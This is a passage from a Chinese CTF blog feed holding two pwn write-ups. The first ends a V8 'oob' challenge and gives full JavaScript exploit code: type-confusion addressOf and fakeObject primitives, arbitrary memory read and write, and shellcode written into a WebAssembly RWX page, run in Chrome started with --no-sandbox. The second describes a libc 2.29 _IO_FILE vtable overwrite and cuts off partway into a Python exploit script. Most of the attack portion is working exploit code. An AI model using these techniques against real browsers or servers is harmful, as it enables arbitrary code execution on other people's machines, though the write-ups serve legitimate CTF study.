<span class="token keyword">var</span> rwx_page_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>wasm_instance_addr <span class="token operator">+</span> <span class="token number">0x88n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'rwx_page_addr = 0x'</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>rwx_page_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> sc_arr <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token number">0x10101010101b848n</span><span class="token punctuation">,</span>    <span class="token number">0x62792eb848500101n</span><span class="token punctuation">,</span>    <span class="token number">0x431480101626d60n</span><span class="token punctuation">,</span>    <span class="token number">0x2f7273752fb84824n</span><span class="token punctuation">,</span>
    <span class="token number">0x48e78948506e6962n</span><span class="token punctuation">,</span>    <span class="token number">0x1010101010101b8n</span><span class="token punctuation">,</span>    <span class="token number">0x6d606279b8485001n</span><span class="token punctuation">,</span>    <span class="token number">0x2404314801010162n</span><span class="token punctuation">,</span>
    <span class="token number">0x1485e086a56f631n</span><span class="token punctuation">,</span>    <span class="token number">0x313b68e6894856e6n</span><span class="token punctuation">,</span>    <span class="token number">0x101012434810101n</span><span class="token punctuation">,</span>    <span class="token number">0x4c50534944b84801n</span><span class="token punctuation">,</span>
    <span class="token number">0x6a52d231503d5941n</span><span class="token punctuation">,</span>    <span class="token number">0x894852e201485a08n</span><span class="token punctuation">,</span>    <span class="token number">0x50f583b6ae2n</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span>



<span class="token keyword">var</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span>sc_arr<span class="token punctuation">.</span>length <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> data_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> buf_backing_store_addr <span class="token operator">=</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span> <span class="token operator">+</span> <span class="token number">0x20n</span><span class="token punctuation">;</span>

<span class="token function">write64</span><span class="token punctuation">(</span>buf_backing_store_addr<span class="token punctuation">,</span> rwx_page_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> sc_arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
	data_view<span class="token punctuation">.</span><span class="token function">setFloat64</span><span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token function">i2f</span><span class="token punctuation">(</span>sc_arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>写成 html 文件，让 chrome 打开：</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">

<span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"a"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> obj_array <span class="token operator">=</span> <span class="token punctuation">[</span>obj<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> float_array <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment">// leak map</span>
<span class="token keyword">var</span> obj_array_map <span class="token operator">=</span> obj_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> float_array_map <span class="token operator">=</span> float_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>



<span class="token comment">//leak address of obj</span>
<span class="token comment">//obj_to_leak: Object</span>
<span class="token comment">//return: integer</span>
<span class="token keyword">function</span> <span class="token function">addressOf</span><span class="token punctuation">(</span><span class="token parameter">obj_to_leak</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	obj_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> obj_to_leak<span class="token punctuation">;</span>
	obj_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span>float_array_map<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//类型混淆</span>

	<span class="token keyword">let</span> obj_addr <span class="token operator">=</span> obj_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	obj_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span>obj_array_map<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//恢复类型</span>

	<span class="token keyword">return</span> <span class="token function">f2i</span><span class="token punctuation">(</span>obj_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//create fake object</span>
<span class="token comment">//addr_to_fake: interger</span>
<span class="token keyword">function</span> <span class="token function">fakeObject</span><span class="token punctuation">(</span><span class="token parameter">addr_to_fake</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>

	float_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr_to_fake<span class="token punctuation">)</span><span class="token punctuation">;</span>
	float_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span>obj_array_map<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">let</span> faked_obj <span class="token operator">=</span> float_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

	float_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span>float_array_map<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> faked_obj<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">var</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> float64 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> bigUint64 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigUint64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//float to integer</span>
<span class="token keyword">function</span> <span class="token function">f2i</span><span class="token punctuation">(</span><span class="token parameter">f</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	float64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> f<span class="token punctuation">;</span>

	<span class="token keyword">return</span> bigUint64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//integer to float</span>
<span class="token keyword">function</span> <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	bigUint64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>

	<span class="token keyword">return</span> float64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//hex</span>
<span class="token keyword">function</span> <span class="token function">hex</span><span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">return</span> i<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">padStart</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token comment">//create fake array obj</span>
<span class="token keyword">var</span> fake_array <span class="token operator">=</span> <span class="token punctuation">[</span>
    float_array_map<span class="token punctuation">,</span>
    <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token number">0n</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token number">0x41414141n</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token number">0x1000000000n</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token number">1.1</span><span class="token punctuation">,</span>
    <span class="token number">2.2</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>


<span class="token keyword">var</span> fake_obj_addr <span class="token operator">=</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>fake_array<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x40n</span> <span class="token operator">+</span> <span class="token number">0x10n</span><span class="token punctuation">;</span>
<span class="token comment">//console.log('fake_obj_addr = ' + hex(fake_obj_addr));</span>
<span class="token keyword">var</span> fake_obj <span class="token operator">=</span> <span class="token function">fakeObject</span><span class="token punctuation">(</span>fake_obj_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">read64</span><span class="token punctuation">(</span><span class="token parameter">addr</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	fake_array<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">0x10n</span> <span class="token operator">+</span> <span class="token number">0x1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">let</span> data <span class="token operator">=</span> <span class="token function">f2i</span><span class="token punctuation">(</span>fake_obj<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token keyword">return</span> data<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">write64</span><span class="token punctuation">(</span><span class="token parameter">addr<span class="token punctuation">,</span> i</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>	
	fake_array<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">0x10n</span> <span class="token operator">+</span> <span class="token number">0x1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	fake_obj<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">var</span> wasmCode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">133</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">131</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">129</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">145</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">121</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">138</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> wasmModule <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Module</span><span class="token punctuation">(</span>wasmCode<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> wasmInstance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Instance</span><span class="token punctuation">(</span>wasmModule<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> f <span class="token operator">=</span> wasmInstance<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>main<span class="token punctuation">;</span>

<span class="token keyword">var</span> f_addr <span class="token operator">=</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1n</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'f_addr = 0x'</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>f_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> shared_info_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>f_addr <span class="token operator">+</span> <span class="token number">0x18n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> wasm_exported_func_data_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>shared_info_addr <span class="token operator">+</span> <span class="token number">0x8n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> wasm_instance_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>wasm_exported_func_data_addr <span class="token operator">+</span> <span class="token number">0x10n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> rwx_page_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>wasm_instance_addr <span class="token operator">+</span> <span class="token number">0x88n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'rwx_page_addr = 0x'</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>rwx_page_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> sc_arr <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token number">0x10101010101b848n</span><span class="token punctuation">,</span>    <span class="token number">0x62792eb848500101n</span><span class="token punctuation">,</span>    <span class="token number">0x431480101626d60n</span><span class="token punctuation">,</span>    <span class="token number">0x2f7273752fb84824n</span><span class="token punctuation">,</span>
    <span class="token number">0x48e78948506e6962n</span><span class="token punctuation">,</span>    <span class="token number">0x1010101010101b8n</span><span class="token punctuation">,</span>    <span class="token number">0x6d606279b8485001n</span><span class="token punctuation">,</span>    <span class="token number">0x2404314801010162n</span><span class="token punctuation">,</span>
    <span class="token number">0x1485e086a56f631n</span><span class="token punctuation">,</span>    <span class="token number">0x313b68e6894856e6n</span><span class="token punctuation">,</span>    <span class="token number">0x101012434810101n</span><span class="token punctuation">,</span>    <span class="token number">0x4c50534944b84801n</span><span class="token punctuation">,</span>
    <span class="token number">0x6a52d231503d5941n</span><span class="token punctuation">,</span>    <span class="token number">0x894852e201485a08n</span><span class="token punctuation">,</span>    <span class="token number">0x50f583b6ae2n</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span>


<span class="token keyword">var</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span>sc_arr<span class="token punctuation">.</span>length <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> data_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> buf_backing_store_addr <span class="token operator">=</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span> <span class="token operator">+</span> <span class="token number">0x20n</span><span class="token punctuation">;</span>

<span class="token function">write64</span><span class="token punctuation">(</span>buf_backing_store_addr<span class="token punctuation">,</span> rwx_page_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> sc_arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		data_view<span class="token punctuation">.</span><span class="token function">setFloat64</span><span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token function">i2f</span><span class="token punctuation">(</span>sc_arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

<span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>chrome 打开记得关闭沙箱，因为沙箱的安全机制，让程序无法执行一些系统调用，本题的考点也没有绕过沙箱，只需要在无沙箱情况下成功 pwn 即可：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">./chrome --no-sandbox<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>成功执行 shellcode 弹出计算器<br><img src="/images/3b546c3b/pasted-36.png" alt="pwn2"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://migraine-sudo.github.io/2020/02/15/v8/">https://migraine-sudo.github.io/2020/02/15/v8/</a></li>
<li><a href="https://skylerlee.github.io/codelet/2017/03/08/build-v8/">https://skylerlee.github.io/codelet/2017/03/08/build-v8/</a></li>
<li><a href="https://www.freebuf.com/vuls/203721.html">https://www.freebuf.com/vuls/203721.html</a></li>
<li><a href="https://www.sunxiaokong.xyz/2020-01-13/lzx-starctf-oob/">https://www.sunxiaokong.xyz/2020-01-13/lzx-starctf-oob/</a></li>
<li><a href="https://github.com/DayJun/Blogs/tree/master/Articles/starCTF-OOB">https://github.com/DayJun/Blogs/tree/master/Articles/starCTF-OOB</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/82854566">https://zhuanlan.zhihu.com/p/82854566</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/43992828">https://zhuanlan.zhihu.com/p/43992828</a></li>
</ul>
]]></content>
      <categories>
        <category>v8</category>
      </categories>
      <tags>
        <tag>v8</tag>
        <tag>ctf</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF6月赛部分writeup</title>
    <url>/ff79dc8d/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>DASCTF6月赛pwn的writeup</p>
<span id="more"></span>

<h2 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h2><p>给了个printf的地址，关闭了stdout，可以改写任意地址上的指针低两字节，再通过这个指针写0x18字节</p>
<p><img src="/images/ff79dc8d/1.png" alt="upload successful"></p>
<p>然后还关闭了stderr,stdin</p>
<p>很容易就想到拿_IO_FILE开刀，但是对这个也不是很熟悉，于是卡了很久</p>
<p>就先看看远程的libc是什么版本，根据printf的地址，查到多个，最后确定了是libc2.29</p>
<p>libc2.29貌似不能修改vtable的内容，而且对vtable指针有要求(具体要求不太清楚)，但是vtable指针附近偏差不大的地方都没什么问题，而且可写</p>
<p>那么就修改__IO_2_1_stderr的vtable指针的低两字节（只要和原来的位置偏差不大，而且可写就行，需要爆破)，然后往新的指针指向的地址写3个qword，第三个刚好就是io_finish的位置，填上one_gadget即可</p>
<p>getshell后记得<code>exec 1&gt;&amp;2</code>恢复输出</p>
<p>exp:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#coding=utf8</span>
<span class="token triple-quoted-string string">'''
脚本使用的库为welpwn(github可搜)
'''</span>

<span class="token keyword">from</span> PwnContext <span class="token keyword">import</span> <span class="token operator">*</span>
      
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'gnome-terminal'</span><span class="token punctuation">,</span> <span class="token string">'-x'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span><span class="token punctuation">,</span> <span class="token string">'-c'</span><span class="token punctuation">]</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
<span class="token comment"># functions for quick script</span>
s       <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#in case that data is an int</span>
sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>delim<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>delim<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
